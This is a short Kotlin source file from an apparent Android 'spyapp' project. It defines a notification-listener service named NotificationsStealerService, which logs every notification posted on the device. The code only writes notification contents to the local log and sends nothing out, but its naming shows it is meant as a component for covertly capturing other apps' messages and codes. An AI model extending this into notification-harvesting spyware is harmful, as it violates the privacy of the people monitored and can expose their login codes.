package npo.kib.spyapp.hacks

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log


class NotificationsStealerService : NotificationListenerService() {

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d("myLogs", "NotificationsStealerService onListenerConnected")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d("myLogs", "NotificationsStealerService onListenerDisconnected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        Log.d("myLogs", "NotificationsStealerService onNotificationPosted")
        Log.d("myLogs", "${sbn?.notification}")
    }
}